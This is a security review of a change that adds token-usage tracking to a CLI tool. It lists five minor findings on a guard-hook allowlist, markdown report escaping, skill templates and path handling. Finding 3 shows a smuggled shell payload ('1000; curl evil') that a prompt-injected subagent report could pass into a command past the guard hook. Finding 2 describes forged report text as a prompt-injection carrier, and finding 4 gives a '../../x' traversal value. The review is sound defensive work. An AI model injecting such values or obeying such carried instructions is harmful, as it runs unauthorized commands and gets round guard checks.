# Security Review: token-usage-tracking-finalize-report-report-data-only-no

VERDICT: PASS_WITH_WARNINGS

Scope reviewed: `git diff main...HEAD -- src tests .claude/hooks` — guard-hook allowlist
(both copies), `src/cli/commands/tokens.ts`, `src/finalize/tokens-report-generator.ts`,
`src/finalize/finalizer.ts`, `src/templates/template-engine.ts` (substitution behavior),
`src/templates/artifacts/tokens.md`, schema changes, skill template wording, and tests.

## Findings

### Critical

None.

### Major

None.

### Minor

1. **Guard allowlist is broader than the feature needs** —
   `.claude/hooks/metta-guard-bash.mjs:24` and `src/templates/hooks/metta-guard-bash.mjs:24`.
   `'tokens'` is added to `ALLOWED_SUBCOMMANDS` (single-word allow), which allowlists
   `metta tokens <anything>` — not just `tokens record`. Today the CLI registers only
   `record` (`src/cli/commands/tokens.ts:23`), so any other third word fails in Commander
   and there is no privilege gain now; but any future `tokens` subcommand (e.g. a
   hypothetical `tokens clear`) would be silently pre-authorized without guard re-review.
   The hook already has the precise mechanism for this: `ALLOWED_TWO_WORD`.
   *Fix:* move the entry to `ALLOWED_TWO_WORD` as `['tokens', new Set(['record'])]` in
   both copies, so unknown `tokens` subcommands stay fail-closed. (Note: this follows the
   existing `iteration` / `model-escalation` precedent, so it is a hardening item, not a
   regression introduced by this change.)

2. **No markdown escaping of untrusted record strings in the report** —
   `src/finalize/tokens-report-generator.ts:42-49` (`renderTable`), `:58`
   (`[r.task, r.agent, ...]`), `:94` (backtick-wrapped gap keys). `task` and `agent` are
   free-form strings (Zod only enforces `min(1)`) injected verbatim into markdown table
   cells; a value containing `|`, a newline, or a backtick breaks the table / code-span
   structure and can forge report content (including text later read by AI agents —
   a prompt-injection carrier into archived artifacts). The writer of these records is
   the local orchestrator, which already has repo write access, so this is not a hard
   trust-boundary break — but the report should be structurally robust.
   *Fix:* escape `|` (`\|`), strip `\r\n` from `task`/`agent` before rendering, and
   escape backticks in `renderGaps`. `model` is safe (enum-constrained,
   `src/schemas/project-config.ts:83`).

3. **Skill wording interpolates subagent-reported text into a shell command** —
   `src/templates/skills/metta-execute/SKILL.md:50`, `metta-plan/SKILL.md:24`,
   `metta-verify/SKILL.md:26`, `metta-next/SKILL.md:30`. The instruction tells the
   orchestrator to build `metta tokens record ... --tokens <count>` from "the token count
   from its completion report" — i.e. lower-trust subagent output flows into a Bash
   command line. A prompt-injected completion report (e.g. `1000; curl evil`) pasted
   naively would run injected shell; the guard hook only polices `metta` invocations, so
   chained non-metta commands pass it. Server-side Zod validation caps damage to the
   record itself but runs after the shell has already executed.
   *Fix:* add one clause to the instruction: `--tokens` must be a bare integer and
   `--task`/`--agent` must be the ids the orchestrator itself assigned (quoted), never
   text copied verbatim from the subagent's prose.

4. **`--change` / `changeName` path handling is traversal-capable (pre-existing pattern)** —
   `src/cli/commands/tokens.ts:46,56` pass `options.change` unsanitized into
   `ArtifactStore.getChange/updateChange`, which `join('changes', name, '.metta.yaml')`
   with no segment validation (`src/artifacts/artifact-store.ts:86-97`); similarly the
   degraded-path cleanup `rm(join(this.specDir, 'changes', changeName, 'TOKENS.md'), { force: true })`
   in `src/finalize/finalizer.ts` (Step 5c catch). A `--change ../../x` value can read or
   write a `.metta.yaml` outside `spec/changes/`. This mirrors every existing `--change`
   command and the CLI runs with the invoking user's own privileges, so exploitability is
   nil for the local threat model — logged for completeness.
   *Fix (optional, repo-wide):* reject change names containing `/`, `\`, or `..` at the
   ArtifactStore boundary.

5. **Unbounded `token_usage` array growth** — `src/cli/commands/tokens.ts:56-58` appends
   with no cap; the guard allowlists the command, so an orchestrator loop can grow a
   change's `.metta.yaml` without bound (self-inflicted disk/parse cost, and metric
   pollution in `metta progress` / TOKENS.md). Accepted by the "report-data-only" design;
   consider a sanity cap (e.g. warn past a few thousand records).

## Explicitly checked and clear

- **Recursive placeholder substitution: not possible.** `TemplateEngine.substitute`
  (`src/templates/template-engine.ts:39-43`) is a single-pass `String.replace` with a
  function callback — substituted values are inserted verbatim and never re-scanned, and
  `$`-patterns in values are not special when a callback is used. A `task` named
  `{change_name}` renders literally.
- **First-word tokenizer bypass:** `tokenize()` correctly follows `&&`/`;`/`||`/`|`
  chains and consumes env-var prefixes; `metta tokens record ... ; metta finalize` still
  classifies the second invocation separately (blocked/Tier-2). No new bypass introduced.
- **Report-data-only claim holds:** `token_usage` is read only by
  `generateTokensReport` (finalize) and `getAvgTokensPerChangeByTier`
  (`src/util/ceremony-metrics.ts`, progress display). Nothing routes or gates on it.
- **Input validation:** `TokenUsageRecordSchema` is `.strict()`, `tokens` is
  `int().positive()` (NaN from `Number('')` rejected), `model` enum-bound, `timestamp`
  server-generated (`src/cli/commands/tokens.ts:49-55`); `ArtifactStore.updateChange`
  re-validates full metadata on write, and YAML output goes through the yaml serializer
  (no YAML injection via task/agent strings).
- **Finalize degradation:** tokens-report failure is warn-and-continue with best-effort
  cleanup of a partial `TOKENS.md`; no truncated artifact swept into the archive.
- **Secrets:** no credentials, tokens (in the auth sense), or keys in any new code; the
  session-credential model in the guard hook is unchanged.

## Summary

0 Critical, 0 Major, 5 Minor. The `tokens` allowlist entry does not widen orchestrator
capability today beyond append-only instrumentation, but should be scoped to the
two-word form to keep future `tokens` subcommands fail-closed.
